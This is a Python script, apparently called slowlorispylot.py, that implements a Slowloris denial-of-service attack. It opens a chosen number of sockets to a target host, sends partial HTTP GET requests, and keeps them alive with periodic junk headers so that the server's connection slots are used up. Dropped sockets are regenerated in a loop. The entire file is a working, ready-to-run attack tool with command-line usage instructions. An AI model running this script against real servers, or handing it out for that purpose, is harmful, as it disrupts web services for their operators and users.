import sys
import random
import socket
import time


def create_socket_and_send_http_get(ip, port):
    #Create Socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #Timeout set to 4 seconds
    s.settimeout(4)
    #Create TCP session
    s.connect((ip, int(port)))
    #Send incomplete HTTP GET request
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode('UTF-8'))
    s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0\r\n".encode('UTF-8'))
    s.send("Accept-language: en-US,en,q=0.5\r\n".encode('UTF-8'))
    return s


def generate_requests(ip, port, socket_count):
    #Socket list to track all the active requests towards the host
    socket_list = []
    #Create the defined number of sockets
    for _ in range(int(socket_count)):
        try:
            print("Creating socket nr {}".format(_))
            s = create_socket_and_send_http_get(ip, port)
        except socket.error:
            #Close the socket in case of error
            if s:
                s.close()
            break
        #Add the generated socket to the list
        socket_list.append(s)
    print("Finished creating {} sockets".format(socket_count))
    return socket_list


def send_keep_alive(ip, port, socket_count, socket_list, timer):
    while True:
        try:
            #Send keep alive requests for all sockets in the socket_list
            print("Sending keep alive to {} active sockets".format(len(socket_list)))
            for s in socket_list:
                try:
                    s.send("X-a {}\r\n".format(random.randint(1, 5000)).encode('UTF-8'))
                except socket.error:
                    #In case of an error, remove the socket from the active list and close it
                    socket_list.remove(s)
                    if s:
                        s.close

            #Get the number of inactive sockets by comparing the number of active sockets and the socket_count paramater
            #Regenerate sockets for the difference between the above numbers
            socket_count_delta = socket_count - len(socket_list)
            if socket_count_delta > 0:
                print("Regenerating {} sockets".format(socket_count_delta))
                socket_list_delta = generate_requests(ip, port, socket_count_delta)
                socket_list += socket_list_delta

            #Wait for a defined period (timer parameter), before the next loop iteration
            time.sleep(timer)

        except (KeyboardInterrupt, SystemExit):
            print("Stopping Slowloris")
            for s in socket_list:
                socket_list.remove(s)
                s.close()
            print("All sockets closed")
            break


def main():
    HELP_MESSAGE = """
    Script help
    slowlorispylot.py [host] [port] [number of sockets] [timeout]
    
    E.g. slowlorispylot.py 127.0.0.1 80 200 15
    """
    if len(sys.argv) < 5:
        print("Parameter missing".format(sys.argv[0]))
        print(HELP_MESSAGE)
        return
    ip = sys.argv[1]
    port = sys.argv[2]
    socket_count = int(sys.argv[3])
    timer = int(sys.argv[4])
    #Generate request
    socket_list = generate_requests(ip, port, socket_count)
    #Keep requests active
    send_keep_alive(ip, port, socket_count, socket_list, timer)


if __name__ == "__main__":
    main()
